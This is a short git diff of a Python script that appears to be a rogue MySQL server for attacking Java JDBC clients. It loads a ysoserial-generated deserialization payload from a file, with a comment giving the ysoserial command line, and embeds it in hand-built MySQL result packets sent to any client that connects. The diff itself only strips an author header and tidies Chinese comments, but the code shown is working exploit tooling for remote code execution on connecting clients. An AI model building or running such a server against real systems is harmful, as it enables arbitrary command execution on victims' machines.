@@ -1,7 +1,3 @@
-# -*- coding:utf-8 -*-
-#@Time : 2020/7/27 2:10
-#@Author: Tri0mphe7
-#@File : server.py
 import socket
 import binascii
 import os
@@ -19,7 +15,7 @@ def send_data(conn,data):
     conn.send(binascii.a2b_hex(data))
 
 def get_payload_content():
-    # //file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  "calc" > a 
+    #file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] > payload
     file= r'payload'
     if os.path.isfile(file):
         with open(file, 'rb') as f:
@@ -69,12 +65,12 @@ def run():
                 mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
                 mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
                 # 为什么我加了EOF Packet 就无法正常运行呢？？
-                # //获取payload
+                # 获取payload
                 payload_content=get_payload_content()
-                # //计算payload长度
+                # 计算payload长度
                 payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
                 payload_length_hex = payload_length[2:4] + payload_length[0:2]
-                # //计算数据包长度
+                # 计算数据包长度
                 data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
                 data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
                 mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
